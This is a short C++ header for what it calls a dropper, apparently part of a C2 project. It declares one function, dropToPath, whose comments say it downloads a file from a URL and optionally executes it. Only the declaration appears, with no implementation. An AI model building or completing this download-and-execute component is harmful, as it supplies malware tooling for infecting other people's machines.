#ifndef DROPPER_H
#define DROPPER_H

/* Standard Header Files */
#include <windows.h>
#include <shlwapi.h>
#include <iostream>
#include <fstream>
//#include <wininet.h>


/* Functions */
//dropToPath takes three parameters, url is the link to the file to download,
//filePath is the filePath we want to drop(include the filename), example: C:\\Users\\53444\\Downloads\\C2\\calc.exe
//if execute is true, is going to run the downloaded file after download finishes
//note that some location might require admin previlige to access
void dropToPath(std::string, std::string, bool);

#endif
